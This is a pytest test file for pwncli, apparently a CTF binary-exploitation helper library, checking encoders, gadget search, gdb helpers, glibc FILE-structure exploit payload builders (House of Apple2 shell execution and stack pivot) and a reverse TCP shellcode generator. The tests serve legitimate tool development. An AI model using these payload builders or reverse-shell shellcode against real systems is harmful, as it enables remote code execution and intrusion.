import os
import pathlib
import subprocess
import tempfile

import pytest
from pwn import context, p64

from pwncli.utils.runtime import current_gdb
from pwncli.utils.runtime.current_gdb import (
    _parse_hex_int,
    _pids_by_process_name,
    attach_existing_process,
    gdb_bins,
    gdb_cmd,
    gdb_heap,
    gdb_heap_base,
    gdb_top_chunk_addr,
)
from pwncli.utils.core.consts import Consts
from pwncli.utils.core.decorates import (
    cache_nonresult,
    cache_result,
    convert_bytes2str,
    convert_str2bytes,
    count_calls,
    limit_calls,
    retry,
)
from pwncli.utils.toolkit.gadgetbox import ElfGadgetBox, RopNotFoundException
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct, payload_replace
from pwncli.utils.core.encoding import (
    b64_decode,
    b64_encode,
    url_decode,
    url_encode,
)
from pwncli.utils.core.packing import u64_ex
from pwncli.utils.core.state import gift
from pwncli.utils.toolkit.pipes import NamedPipePair
from pwncli.utils.toolkit.shellcode import ShellcodeMall, shellcode2unicode


CURDIR = pathlib.Path(__file__).parent
PWN_PATH = str((CURDIR / "../sources/pwn").resolve())


@pytest.fixture(autouse=True)
def clean_gift():
    old = dict(gift)
    gift.clear()
    yield
    gift.clear()
    gift.update(old)


class TestEncodingHelpers:
    def test_url_and_base64_roundtrip_binary_payloads(self):
        payload = b"\x00\x01/bin/sh\x00 hello"

        encoded = url_encode(payload)
        assert encoded == "%00%01%2Fbin%2Fsh%00%20hello"
        assert url_encode(b"/bin/sh", safe="/") == "/bin/sh"
        assert url_decode(encoded) == payload

        b64 = b64_encode(payload)
        assert b64 == "AAEvYmluL3NoACBoZWxsbw=="
        assert b64_decode(b64) == payload
        assert b64_decode(b64.encode()) == payload


class TestConsts:
    def test_common_constants_and_syscalls(self):
        assert Consts.mmap.PROT_RWX == (
            Consts.mmap.PROT_READ | Consts.mmap.PROT_WRITE | Consts.mmap.PROT_EXEC
        )
        assert Consts.mmap.MAP_ANON == Consts.mmap.MAP_ANONYMOUS
        assert Consts.open.AT_FDCWD == -100
        assert Consts.syscall.amd64.EXECVE == 59
        assert Consts.syscall.amd64.OPENAT == 257
        assert Consts.syscall.i386.EXECVE == 11
        assert Consts.syscall.i386.OPENAT == 295

    def test_show_group_and_unknown_group(self, capsys):
        Consts.show("mmap")
        out = capsys.readouterr().out
        assert "mmap" in out
        assert "PROT_RWX" in out
        assert "MAP_ANONYMOUS" in out

        Consts.show("does_not_exist")
        assert "Unknown group 'does_not_exist'" in capsys.readouterr().out


class TestDecorators:
    def test_convert_decorators_convert_args_and_kwargs(self):
        @convert_str2bytes
        def wants_bytes(arg, *, kw):
            return arg, kw

        @convert_bytes2str
        def wants_str(arg, *, kw):
            return arg, kw

        assert wants_bytes("abc", kw="def") == (b"abc", b"def")
        assert wants_str(b"abc", kw=b"def") == ("abc", "def")

    def test_cache_and_call_control_decorators(self):
        calls = []

        @cache_result
        def cached(value):
            calls.append(value)
            return value

        assert cached(1) == 1
        assert cached(2) == 1
        assert calls == [1]

        maybe_calls = []

        @cache_nonresult
        def cached_after_non_none(value):
            maybe_calls.append(value)
            return None if value == 0 else value

        assert cached_after_non_none(0) is None
        assert cached_after_non_none(7) == 7
        assert cached_after_non_none(8) == 7
        assert maybe_calls == [0, 7]

        @limit_calls(2, warn_=False)
        def limited():
            return "ok"

        assert limited() == "ok"
        assert limited() == "ok"
        assert limited() is None

    def test_retry_and_count_calls(self, capsys):
        attempts = {"count": 0}

        @retry(3)
        def flaky():
            attempts["count"] += 1
            if attempts["count"] < 2:
                raise RuntimeError("boom")
            return "done"

        @count_calls(show=True)
        def add(a, b):
            return a + b

        assert flaky() == "done"
        assert attempts["count"] == 2
        assert add(1, 2) == 3
        assert add._num_calls == 1
        assert "Call 1 of add" in capsys.readouterr().out


class TestNamedPipePair:
    def test_single_fifo_send_recv_helpers(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            path = os.path.join(tmpdir, "fifo")
            pipe = NamedPipePair(path, path, log_level="error", created=True, deleted=False)
            try:
                assert pipe.sendline("hello", timeout=1) == 6
                assert pipe.recvline(drop=True, timeout=1) == b"hello"

                assert pipe.send(b"prompt: valueENDtail", timeout=1)
                pipe.sendafter(b"prompt: ", b"next", timeout=1)
                assert pipe.recvuntil(b"END", timeout=1) == b"valueEND"
                assert pipe.recv(4, timeout=1) == b"tail"
                assert pipe.recv(4, timeout=1) == b"next"
            finally:
                del pipe

    def test_init_pipe_rejects_non_fifo(self, tmp_path):
        regular = tmp_path / "regular"
        regular.write_text("not a fifo")
        with pytest.raises(RuntimeError, match="is not FIFO file"):
            NamedPipePair(str(regular), str(regular), log_level="error")


class TestElfGadgetBox:
    def test_search_string_opcode_and_helpers(self):
        box = ElfGadgetBox()
        box.add_file("pwn", PWN_PATH)

        assert box.search_string("admin", "pwn") == 0x3015
        assert box.search_string(b"flag", "pwn") == 0x301B
        assert box.search_opcode("5fc3", "pwn") == 0x23B3
        assert box.get_pop_rdi_ret("pwn") == 0x23B3

        rets = box.search_opcode("c3", "pwn", get_list=True)
        assert 0x201A in rets
        assert 0x2144 in rets

    def test_search_missing_gadget_raises(self):
        box = ElfGadgetBox()
        box.add_file("pwn", PWN_PATH)
        with pytest.raises(RopNotFoundException):
            box.search_opcode("0f05", "pwn")


class TestGdbHelpers:
    def test_parse_hex_int(self):
        assert _parse_hex_int("top = 0x5555555592a0\n") == 0x5555555592A0
        assert _parse_hex_int("no address here") == 0
        assert _parse_hex_int("") == 0

    def test_pids_by_process_name(self, monkeypatch):
        monkeypatch.setattr(
            current_gdb.subprocess,
            "check_output",
            lambda *args, **kwargs: b"42\n7\n100\n",
        )
        assert _pids_by_process_name("python") == [7, 42, 100]

        def no_match(*args, **kwargs):
            raise subprocess.CalledProcessError(1, args[0])

        monkeypatch.setattr(current_gdb.subprocess, "check_output", no_match)
        assert _pids_by_process_name("missing") == []

    def test_attach_existing_process_by_name_uses_lowest_pid(self, monkeypatch):
        attached = {}
        stopped = []
        warnings = []

        monkeypatch.setattr(current_gdb, "_pids_by_process_name", lambda name: [30, 40])
        monkeypatch.setattr(current_gdb.os.path, "exists", lambda path: path == "/proc/30")
        monkeypatch.setattr(current_gdb, "stop", lambda stop_=True: stopped.append(stop_))
        monkeypatch.setattr(current_gdb, "warn_ex", lambda msg, *args: warnings.append(msg % args if args else msg))

        def fake_attach(pid, gdbscript=""):
            attached["args"] = (pid, gdbscript)
            return "gdb"

        monkeypatch.setattr(current_gdb, "attach", fake_attach)

        res = attach_existing_process("target", "break main", stop_=False)

        assert res == "gdb"
        assert attached["args"] == (30, "break main")
        assert stopped == [False]
        assert "Multiple processes named 'target'" in warnings[0]

    def test_gdb_cmd_disabled_in_remote_mode(self, monkeypatch):
        warnings = []
        gift.remote = True
        monkeypatch.setattr(current_gdb, "warn_ex", lambda msg, *args: warnings.append(msg % args if args else msg))

        assert gdb_cmd("heap") == ""
        assert warnings == ["gdb_cmd: disabled in remote mode (no local gdb on the target)."]

    def test_gdb_cmd_strips_echo_prompt_and_handles_capture_lines(self, monkeypatch):
        gift.remote = False
        system_calls = []
        check_calls = []

        def fake_check_output(args):
            check_calls.append(args)
            if "-S" in args:
                return b"old output\npwndbg> heap\nchunk A\nchunk B\npwndbg> "
            return b"pwndbg> "

        monkeypatch.setattr(current_gdb, "_get_tmux_info", lambda: "sess:1.1")
        monkeypatch.setattr(current_gdb.subprocess, "check_output", fake_check_output)
        monkeypatch.setattr(current_gdb.os, "system", lambda cmd: system_calls.append(cmd) or 0)
        monkeypatch.setattr(current_gdb.time, "sleep", lambda seconds: None)

        assert gdb_cmd("heap", wait=0.01, timeout=0.05, quiet=True, capture_lines=400) == "chunk A\nchunk B"

        assert "tmux send-keys -t sess:1.1 C-l" in system_calls
        assert "tmux clear-history -t sess:1.1" in system_calls
        assert "tmux send-keys -t sess:1.1 'heap' Enter" in system_calls
        assert ["tmux", "capture-pane", "-t", "sess:1.1", "-p", "-S", "-400"] in check_calls

    def test_gdb_heap_wrappers_delegate_to_gdb_cmd(self, monkeypatch):
        calls = []

        def fake_gdb_cmd(cmd, **kwargs):
            calls.append((cmd, kwargs))
            if "main_arena.top" in cmd:
                return "top is 0x12345000"
            if "active_heap.start" in cmd:
                return "heap @ 0x55555000"
            return "table output"

        monkeypatch.setattr(current_gdb, "gdb_cmd", fake_gdb_cmd)
        monkeypatch.setattr(current_gdb, "log_ex", lambda *args, **kwargs: None)

        assert gdb_top_chunk_addr() == 0x12345000
        assert gdb_heap_base() == 0x55555000
        assert gdb_bins(timeout=3.5) == "table output"
        assert gdb_heap(timeout=4.5) == "table output"

        assert calls[0][1] == {"quiet": True}
        assert calls[1][1] == {"quiet": True}
        assert calls[2] == ("bins", {"timeout": 3.5, "capture_lines": 400})
        assert calls[3] == ("heap", {"timeout": 4.5, "capture_lines": 1000})


class TestIoFileHelpers:
    def test_mode_property_writes_arch_specific_unknown2_bits(self):
        with context.local(arch="amd64", bits=64):
            fake = IO_FILE_plus_struct()
            fake._mode = 0x12345678
            payload = bytes(fake)
            assert fake._mode == 0x12345678
            assert u64_ex(payload[0xC0:0xC8]) == 0x12345678

        with context.local(arch="i386", bits=32):
            fake = IO_FILE_plus_struct()
            fake._mode = 0x11223344
            payload = bytes(fake)
            assert fake._mode == 0x11223344
            assert u64_ex(payload[0x68:0x70]) == 0x11223344

    def test_house_of_apple2_execmd_payload_uses_fake_file_addr_self_references(self):
        with context.local(arch="amd64", bits=64):
            fake_file = 0x55555000
            jumps = 0x7FFFF7E00000
            system = 0x7FFFF7D00000
            payload = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(
                fake_file, jumps, system, cmd="sh"
            )

            assert u64_ex(payload[0x00:0x08]) == 0x68732020
            assert u64_ex(payload[0x20:0x28]) == 0
            assert u64_ex(payload[0x28:0x30]) == 1
            assert u64_ex(payload[0x68:0x70]) == system
            assert u64_ex(payload[0x88:0x90]) == fake_file - 0x10
            assert u64_ex(payload[0x98:0xA0]) == fake_file
            assert u64_ex(payload[0xA0:0xA8]) == fake_file - 0x48
            assert u64_ex(payload[0xC0:0xC8]) == 0
            assert u64_ex(payload[0xD8:0xE0]) == jumps

    def test_house_of_apple2_stack_pivot_payload_fields(self):
        with context.local(arch="amd64", bits=64):
            fake_file = 0x55555000
            jumps = 0x7FFFF7E00000
            leave_ret = 0x401020
            pop_rbp = 0x401030
            fake_rbp = 0x55556000
            payload = IO_FILE_plus_struct().house_of_apple2_stack_pivoting_when_exit(
                fake_file, jumps, leave_ret, pop_rbp, fake_rbp
            )

            assert u64_ex(payload[0x08:0x10]) == pop_rbp
            assert u64_ex(payload[0x10:0x18]) == fake_rbp
            assert u64_ex(payload[0x18:0x20]) == leave_ret
            assert u64_ex(payload[0x28:0x30]) == 1
            assert u64_ex(payload[0x68:0x70]) == leave_ret
            assert u64_ex(payload[0x88:0x90]) == fake_file - 0x10
            assert u64_ex(payload[0x98:0xA0]) == fake_file
            assert u64_ex(payload[0xA0:0xA8]) == fake_file - 0x48
            assert u64_ex(payload[0xD8:0xE0]) == jumps

    def test_payload_replace_replaces_offsets_markers_and_extends(self):
        with context.local(arch="amd64", bits=64):
            assert payload_replace(
                b"AAAA----BBBB",
                {b"AAAA": 0x41424344, b"BBBB": b"Z"},
                filler="X",
            ) == b"DCBA\x00\x00\x00\x00ZBBB"
            assert payload_replace(b"abc", {8: b"Z"}, filler=b"Q") == b"abcQQQQQZ"
            assert payload_replace("abc", {1: "Z"}) == b"aZc"

            with pytest.raises(AssertionError, match="Cannot find off"):
                payload_replace(b"abc", {b"missing": b"x"})


class TestShellcodeHelpers:
    def test_shellcode_format_helpers(self):
        assert shellcode2unicode(b"\x00A\xff") == r"\x00\x41\xff"
        assert ShellcodeMall.generate_payload_for_connect("127.0.0.1", 4444) == (
            b"\x02\x00" + (4444).to_bytes(2, "big") + b"\x7f\x00\x00\x01" + p64(0)
        )

    def test_reverse_tcp_connect_embeds_ip_and_port(self):
        shellcode = ShellcodeMall.amd64.reverse_tcp_connect("1.2.3.4", 31337)
        assert (31337).to_bytes(2, "big") + b"\x01\x02\x03\x04" in shellcode
